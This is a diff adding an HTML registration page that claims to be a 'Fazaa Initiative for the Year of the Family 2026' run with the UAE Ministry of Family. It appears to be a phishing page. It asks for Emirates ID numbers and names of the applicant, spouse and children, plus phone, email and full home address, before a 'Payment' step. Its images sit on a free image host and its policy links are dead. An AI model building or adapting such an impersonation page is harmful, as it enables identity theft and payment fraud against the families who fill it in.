@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fazaa Initiative for the Year of the Family 2026</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f5f7fa; color: #1e3a5f; line-height: 1.6; }
+
+        header { background-color: #ffffff; padding: 15px 20px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05); position: sticky; top: 0; z-index: 1000; }
+        .header-container { display: flex; justify-content: space-between; align-items: center; max-width: 1200px; margin: 0 auto; }
+        
+        .logo-container img { max-height: 50px; width: auto; display: block; }
+        
+        .lang-switch { background: linear-gradient(135deg, #d4af37, #aa7c11); color: #fff; border: none; padding: 8px 18px; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 0.9rem; transition: 0.3s; }
+        .lang-switch:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(170, 124, 17, 0.2); }
+
+        .hero-banner { width: 100%; max-width: 600px; margin: 20px auto 0 auto; padding: 0 15px; }
+        .hero-banner img { width: 100%; border-radius: 16px; display: block; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+
+        .container { max-width: 600px; margin: 20px auto; padding: 0 15px; text-align: center; }
+        
+        .main-title { color: #1e3a5f; font-size: 1.6rem; font-weight: bold; margin-bottom: 5px; }
+        .sub-title { color: #6c7a89; font-size: 0.95rem; margin-bottom: 25px; padding: 0 10px; }
+
+        .steps-container { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 25px; font-size: 0.9rem; color: #a0aec0; }
+        .step { display: flex; align-items: center; gap: 6px; }
+        .step.active { color: #1e3a5f; font-weight: bold; }
+        .step-num { width: 24px; height: 24px; border-radius: 50%; background-color: #e2e8f0; color: #718096; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: bold; }
+        .step.active .step-num { background-color: #1e3a5f; color: #fff; }
+        .step-line { width: 40px; height: 2px; background-color: #e2e8f0; }
+
+        .instructions-box { background-color: #ffffff; border: 1.5px solid #d4af37; border-radius: 12px; margin-bottom: 20px; overflow: hidden; text-align: left; }
+        .instructions-header { padding: 15px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; font-weight: bold; color: #1e3a5f; }
+        .instructions-header .arrow-icon { color: #d4af37; transition: 0.3s; }
+        .instructions-content { padding: 0 15px 15px 15px; display: none; color: #4a5568; font-size: 0.9rem; border-top: 1px solid #edf2f7; padding-top: 10px; }
+
+        .form-section { background: #ffffff; border-radius: 16px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.02); border: 1px solid #edf2f7; margin-bottom: 20px; text-align: left; display: none; }
+        .form-section.always-show { display: block; }
+        
+        .section-title { color: #1e3a5f; font-size: 1.25rem; font-weight: bold; margin-bottom: 20px; border-bottom: 3px solid #d4af37; padding-bottom: 10px; display: inline-block; width: 100%; }
+
+        .cards-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 10px; }
+        .card-option { border: 1.5px solid #e2e8f0; border-radius: 14px; padding: 12px 5px; cursor: pointer; text-align: center; transition: 0.3s; position: relative; background: #fff; }
+        .card-option input[type="radio"] { display: none; }
+        .card-option img { width: 100%; height: auto; border-radius: 8px; margin-bottom: 10px; display: block; }
+        .card-name-ar { font-weight: bold; font-size: 0.95rem; color: #2d3748; display: block; }
+        .card-name-en { font-size: 0.75rem; color: #718096; display: block; }
+        .card-option.selected { border-color: #d4af37; background-color: #fefaf0; box-shadow: 0 4px 12px rgba(212, 175, 55, 0.15); }
+
+        .input-group { margin-bottom: 20px; text-align: left; }
+        .input-group label { display: block; font-weight: bold; font-size: 0.95rem; color: #2d3748; margin-bottom: 8px; }
+        .input-group label span { color: #e53e3e; margin-left: 3px; }
+        .input-control { width: 100%; padding: 14px 16px; border: 1.5px solid #e2e8f0; border-radius: 12px; background-color: #f7fafc; font-size: 1rem; color: #2d3748; outline: none; transition: 0.3s; text-align: left; }
+        .input-control:focus { border-color: #1e3a5f; background-color: #fff; box-shadow: 0 0 0 3px rgba(30, 58, 95, 0.1); }
+        
+        .children-block { border-top: 1px dashed #e2e8f0; margin-top: 15px; padding-top: 15px; }
+        .child-title { font-size: 1rem; font-weight: bold; color: #aa7c11; margin-bottom: 15px; display: block; }
+
+        .agreement-container { display: flex; align-items: flex-start; gap: 12px; margin: 25px 5px; text-align: left; cursor: pointer; font-size: 0.95rem; color: #1e3a5f; font-weight: 500; }
+        .agreement-container input[type="checkbox"] { display: none; }
+        .custom-checkbox { width: 22px; height: 22px; border: 2px solid #d4af37; border-radius: 6px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: 0.2s; background: #fff; margin-top: 2px; }
+        .agreement-container input[type="checkbox"]:checked + .custom-checkbox { background-color: #ffffff; border-color: #d4af37; }
+        .custom-checkbox::after { content: "✓"; color: #d4af37; font-size: 1.1rem; font-weight: bold; display: none; }
+        .agreement-container input[type="checkbox"]:checked + .custom-checkbox::after { display: block; }
+
+        .btn-submit { background: #1e3a5f; color: #ffffff; font-weight: bold; padding: 16px; border-radius: 50px; border: none; width: 100%; font-size: 1.15rem; cursor: pointer; transition: 0.3s; margin-top: 5px; box-shadow: 0 4px 12px rgba(30, 58, 95, 0.15); }
+        .btn-submit:hover { background: #142842; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(30, 58, 95, 0.25); }
+
+        footer { background-color: #1e3a5f; color: #ffffff; padding: 40px 20px; margin-top: 40px; border-top: 4px solid #d4af37; text-align: center; }
+        .footer-links { margin-bottom: 15px; }
+        .footer-links a { color: #ffffff; text-decoration: none; margin: 0 15px; font-size: 0.95rem; opacity: 0.9; transition: 0.3s; font-weight: 500; }
+        .footer-links a:hover { color: #d4af37; opacity: 1; }
+        .footer-managed { font-size: 0.9rem; color: #e2e8f0; margin-bottom: 10px; opacity: 0.8; }
+        .copyright { color: #cbd5e1; font-size: 0.85rem; opacity: 0.7; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-container">
+            <button class="lang-switch" onclick="window.location.href='index_ar.html'">العربية</button>
+            <div class="logo-container">
+                <img src="https://i.ibb.co/MDLJXRC1/unnamed-2.png" alt="Fazaa Logo">
+            </div>
+        </div>
+    </header>
+
+    <div class="hero-banner">
+        <img src="https://i.ibb.co/yckbnyWH/7bb8299f-e545-4012-a1b2-6c48cd8c91a2.jpg" alt="Fazaa Initiative">
+    </div>
+
+    <div class="container">
+        <h1 class="main-title">Fazaa Initiative for the Year of the Family 2026</h1>
+        <p class="sub-title">In cooperation with the Ministry of Family, Fazaa offers exclusive packages to support the quality of life for Emirati families.</p>
+
+        <div class="steps-container">
+            <div class="step active"><span class="step-num">1</span> Data</div>
+            <div class="step-line"></div>
+            <div class="step"><span class="step-num">2</span> Confirmation</div>
+            <div class="step-line"></div>
+            <div class="step"><span class="step-num">3</span> Payment</div>
+        </div>
+
+        <div class="instructions-box">
+            <div class="instructions-header" onclick="toggleInstructions()">
+                <span>Registration Instructions</span>
+                <span class="arrow-icon" id="instructionArrow">▼</span>
+            </div>
+            <div class="instructions-content" id="instructionsContent">
+                Please enter your personal data accurately and choose the preferred category type to issue your card successfully.
+            </div>
+        </div>
+
+        <form action="confirmation.html" method="GET" id="registrationForm">
+            <div class="form-section always-show">
+                <h2 class="section-title">Select Card Type</h2>
+                <div class="cards-grid">
+                    <label class="card-option" onclick="selectCard(this, 'platinum')">
+                        <input type="radio" name="card_type" value="platinum" required>
+                        <img src="https://i.ibb.co/60xc9jxT/Platinum.png" alt="Platinum">
+                        <span class="card-name-ar">بلاتينيوم</span>
+                        <span class="card-name-en">Platinum</span>
+                    </label>
+
+                    <label class="card-option" onclick="selectCard(this, 'gold')">
+                        <input type="radio" name="card_type" value="gold">
+                        <img src="https://i.ibb.co/zTtvJy3p/Gold.png" alt="Gold">
+                        <span class="card-name-ar">ذهبية</span>
+                        <span class="card-name-en">Gold</span>
+                    </label>
+
+                    <label class="card-option" id="silverCardOption" onclick="selectCard(this, 'silver')">
+                        <input type="radio" name="card_type" value="silver">
+                        <img src="https://i.ibb.co/HpHKNFKZ/Silver.png" alt="Silver">
+                        <span class="card-name-ar">فضية</span>
+                        <span class="card-name-en">Silver</span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="form-section" id="personalSection">
+                <h2 class="section-title">Personal Data</h2>
+                <div class="input-group">
+                    <label>Full Name <span>*</span></label>
+                    <input type="text" name="full_name" class="input-control" placeholder="Please enter your name as in ID">
+                </div>
+                <div class="input-group">
+                    <label>Emirates ID Number <span>*</span></label>
+                    <input type="text" name="emirates_id" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
+                </div>
+                <div class="input-group">
+                    <label>Spouse Name <span>*</span></label>
+                    <input type="text" name="spouse_name" class="input-control" placeholder="Full name of spouse">
+                </div>
+                <div class="input-group">
+                    <label>Spouse ID Number <span>*</span></label>
+                    <input type="text" name="spouse_id" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
+                </div>
+
+                <div id="childrenContainer">
+                    <div class="children-block child-field" data-child="1">
+                        <span class="child-title">Child Data (1)</span>
+                        <div class="input-group">
+                            <label>Child Name <span>*</span></label>
+                            <input type="text" name="child_name_1" class="input-control" placeholder="Full name of child">
+                        </div>
+                        <div class="input-group">
+                            <label>Child ID Number <span>*</span></label>
+                            <input type="text" name="child_id_1" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
+                        </div>
+                    </div>
+                    <div class="children-block child-field" data-child="2">
+                        <span class="child-title">Child Data (2)</span>
+                        <div class="input-group">
+                            <label>Child Name <span>*</span></label>
+                            <input type="text" name="child_name_2" class="input-control" placeholder="Full name of child">
+                        </div>
+                        <div class="input-group">
+                            <label>Child ID Number <span>*</span></label>
+                            <input type="text" name="child_id_2" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
+                        </div>
+                    </div>
+                    <div class="children-block child-field" data-child="3">
+                        <span class="child-title">Child Data (3)</span>
+                        <div class="input-group">
+                            <label>Child Name <span>*</span></label>
+                            <input type="text" name="child_name_3" class="input-control" placeholder="Full name of child">
+                        </div>
+                        <div class="input-group">
+                            <label>Child ID Number <span>*</span></label>
+                            <input type="text" name="child_id_3" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
+                        </div>
+                    </div>
+                    <div class="children-block child-field" data-child="4">
+                        <span class="child-title">Child Data (4)</span>
+                        <div class="input-group">
+                            <label>Child Name <span>*</span></label>
+                            <input type="text" name="child_name_4" class="input-control" placeholder="Full name of child">
+                        </div>
+                        <div class="input-group">
+                            <label>Child ID Number <span>*</span></label>
+                            <input type="text" name="child_id_4" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
+                        </div>
+                    </div>
+                </div>
+
+                <div style="border-top: 1px solid #edf2f7; margin-top: 20px; padding-top: 20px;">
+                    <div class="input-group">
+                        <label>Mobile Phone Number <span>*</span></label>
+                        <input type="tel" name="phone" class="input-control" placeholder="05XXXXXXXX">
+                    </div>
+                    <div class="input-group">
+                        <label>Email (Gmail) <span>*</span></label>
+                        <input type="email" name="email" class="input-control" placeholder="example@gmail.com">
+                    </div>
+                    <div class="input-group">
+                        <label>Residency Status <span>*</span></label>
+                        <select name="residency_status" class="input-control">
+                            <option value="" disabled selected>Select status...</option>
+                            <option value="citizen">Citizen</option>
+                            <option value="resident">Resident</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-section" id="deliverySection">
+                <h2 class="section-title">Address and Delivery Data</h2>
+                <div class="input-group">
+                    <label>Emirate <span>*</span></label>
+                    <select name="emirate" id="emirateSelect" class="input-control" onchange="updateAreas()">
+                        <option value="" disabled selected>Select Emirate...</option>
+                        <option value="dubai">Dubai</option>
+                        <option value="abudhabi">Abu Dhabi</option>
+                        <option value="sharjah">Sharjah</option>
+                        <option value="ajman">Ajman</option>
+                        <option value="rasalkhaimah">Ras Al Khaimah</option>
+                        <option value="fujairah">Fujairah</option>
+                        <option value="ummalquwain">Umm Al Quwain</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Area / Location <span>*</span></label>
+                    <select name="area" id="areaSelect" class="input-control">
+                        <option value="" disabled selected>Please select Emirate first...</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Street Name or Number <span>*</span></label>
+                    <input type="text" name="street" class="input-control" placeholder="Example: Sheikh Zayed Road / Street No. 12">
+                </div>
+                <div class="input-group">
+                    <label>Building Number <span>*</span></label>
+                    <input type="text" name="building" class="input-control" placeholder="Example: Building No. 45 or Tower Name">
+                </div>
+                <div class="input-group">
+                    <label>Floor and Apartment Number <span>*</span></label>
+                    <input type="text" name="floor_apartment" class="input-control" placeholder="Example: Floor 4 - Apt 402">
+                </div>
+            </div>
+
+            <div id="submitSection" style="display: none;">
+                <label class="agreement-container">
+                    <input type="checkbox" name="declaration" id="declarationCheckbox" required>
+                    <div class="custom-checkbox"></div>
+                    <span>I declare that the data provided is correct and I agree to the terms and conditions</span>
+                </label>
+                <div class="form-section always-show" style="background: transparent; box-shadow: none; border: none; padding: 0;">
+                    <button type="submit" class="btn-submit">Submit Application</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a> | <a href="#">Terms and Conditions</a>
+        </div>
+        <div class="footer-managed">This site is operated and managed by the Fazaa Initiative for supporting Emirati families.</div>
+        <div class="copyright">&copy; 2026 All rights reserved to Fazaa UAE.</div>
+    </footer>
+
+    <script>
+        const areasData = {
+            dubai: ["Deira", "Bur Dubai", "JBR", "Marina", "Al Barsha", "Al Khawaneej", "International City", "Silicon Oasis", "Mirdif"],
+            abudhabi: ["Khalidiya", "Mushrif", "Muroor", "Al Raha Beach", "Yas Island", "Saadiyat Island", "MBZ City", "Khalifa City"],
+            sharjah: ["Al Majaz", "Al Khan", "Al Taawun", "Al Nahda", "Al Shahba", "Al Rahmaniya", "Muwaileh", "Al Qasimia"],
+            ajman: ["Al Rashidiya", "Al Nuaimiya", "Al Bustan", "Al Rawda", "Al Mowaihat", "Al Jurf", "Ajman Corniche"],
+            rasalkhaimah: ["Al Dhait", "Al Hamra", "Al Jazirah Al Hamra", "Al Nakheel", "Al Qawasim Corniche", "Gulfar"],
+            fujairah: ["Al Faseel", "Al Maseela", "City Center", "Dibba Al Fujairah", "Qidfa"],
+            ummalquwain: ["Al Muhadhah", "Al Salamah", "Al Rawda", "Al Baladia", "Al Hamra"]
+        };
+
+        window.addEventListener('DOMContentLoaded', (event) => {
+            const silverOption = document.getElementById('silverCardOption');
+            if (silverOption) { selectCard(silverOption, 'silver'); }
+        });
+
+        function toggleInstructions() {
+            var content = document.getElementById('instructionsContent');
+            var arrow = document.getElementById('instructionArrow');
+            if (content.style.display === 'block') { content.style.display = 'none'; arrow.textContent = '▼'; }
+            else { content.style.display = 'block'; arrow.textContent = '▲'; }
+        }
+
+        function selectCard(element, cardType) {
+            document.querySelectorAll('.card-option').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            element.querySelector('input[type="radio"]').checked = true;
+
+            const personalSection = document.getElementById('personalSection');
+            const deliverySection = document.getElementById('deliverySection');
+            const submitSection = document.getElementById('submitSection');
+            
+            personalSection.style.display = 'block';
+            deliverySection.style.display = 'block';
+            submitSection.style.display = 'block';
+
+            personalSection.querySelectorAll('input, select').forEach(input => { if(!input.closest('.child-field')) input.required = true; });
+            deliverySection.querySelectorAll('input, select').forEach(input => input.required = true);
+
+            const allChildBlocks = document.querySelectorAll('.child-field');
+            allChildBlocks.forEach(block => {
+                const childNum = parseInt(block.getAttribute('data-child'));
+                const inputs = block.querySelectorAll('input');
+                if (cardType === 'silver') { block.style.display = 'none'; inputs.forEach(input => { input.required = false; input.value = ''; }); }
+                else if (cardType === 'gold') {
+                    if (childNum <= 2) { block.style.display = 'block'; inputs.forEach(input => input.required = true); }
+                    else { block.style.display = 'none'; inputs.forEach(input => { input.required = false; input.value = ''; }); }
+                } else if (cardType === 'platinum') { block.style.display = 'block'; inputs.forEach(input => input.required = true); }
+            });
+        }
+
+        function updateAreas() {
+            const emirateSelect = document.getElementById('emirateSelect');
+            const areaSelect = document.getElementById('areaSelect');
+            const selectedEmirate = emirateSelect.value;
+            areaSelect.innerHTML = '<option value="" disabled selected>Select Area...</option>';
+            if (areasData[selectedEmirate]) {
+                areasData[selectedEmirate].forEach(function(area) {
+                    const option = document.createElement('option');
+                    option.value = area; option.textContent = area; areaSelect.appendChild(option);
+                });
+            }
+        }
+    </script>
+</body>
+</html>
